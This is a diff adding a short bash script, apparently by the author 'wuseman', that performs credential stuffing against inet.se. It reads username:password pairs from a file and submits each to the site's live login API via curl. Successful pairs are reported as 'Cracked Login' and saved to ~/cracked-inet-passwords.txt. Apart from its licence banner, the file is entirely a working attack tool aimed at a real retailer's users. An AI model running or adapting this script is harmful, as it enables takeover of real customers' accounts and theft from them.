@@ -1,0 +1,63 @@
+#!/bin/bash
+###############################################################################
+###############################################################################
+###                                                                         ###
+### If you will copy any developers work and claim you are the dev/founder  ###
+### it wont make you a hacker - The only person you're fooling is yourself  ###
+### so please respect all developers and GPL Licenses no matter if it's my  ###
+### script, tool or project or if it's anyone else, thank you!      	    ###
+###                                                                         ###
+###############################################################################
+###############################################################################
+####                                                                       ####
+####  Copyright (C) 2018-2019, wuseman                                     ####
+####                                                                       ####
+####  This program is free software; you can redistribute it and/or modify ####
+####  it under the terms of the GNU General Public License as published by ####
+####  the Free Software Foundation; either version 2 of the License, or    ####
+####  (at your option) any later version.                                  ####
+####                                                                       ####
+####  This program is distributed in the hope that it will be useful,      ####
+####  but WITHOUT ANY WARRANTY; without even the implied warranty of       ####
+####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        ####
+####  GNU General Public License for more details.                         ####
+####                                                                       ####
+####  You must obey the GNU General Public License. If you will modify     ####
+####  winet file(s), you may extend this exception to your version         ####
+####  of the file(s), but you are not obligated to do so.  If you do not   ####
+####  wish to do so, delete this exception statement from your version.    ####
+####  If you delete this exception statement from all source files in the  ####
+####  program, then also delete it here.                                   ####
+####                                                                       ####
+####  Contact:                                                             ####
+####          IRC: Freenode @ wuseman                                      ####
+####          Mail: wuseman <wuseman@nr1.nu>                               ####
+####                                                                       ####
+###############################################################################
+
+usage() {
+cat << EOF
+
+    Usage: ./$basename$0 <file.txt>
+ 
+EOF
+}
+
+if [[ -z $1 ]]; then usage; exit 1; fi
+
+while read line; do 
+INET_USER="$(echo $line|cut -d: -f1)"
+INET_PASSWORD="$(echo $line |cut -d: -f2)"
+     curl -s 'https://www.inet.se/api/user/login' \
+       -H 'Referer: https://www.inet.se/' \
+       -H 'Content-Type: application/json' \
+       -H 'X-Requested-With: XMLHttpRequest' \
+       -H 'Cookie: __cfduid=d82e8a3771ceeeeb7b4d2379edd0375901574827653' \
+       --data "{'username':'$INET_USER','password':'$INET_PASSWORD'}"|grep -iq Success
+           if [[ "$?" = "0" ]]; then
+           echo -e "[\e[1;32m>>\e[0m] - Cracked Login: $line"
+           echo -e "$line" >> ~/cracked-inet-passwords.txt
+           else
+           echo -e "[\e[1;31m<<\e[0m] - Wrong Login: $line"
+           fi
+done < $1
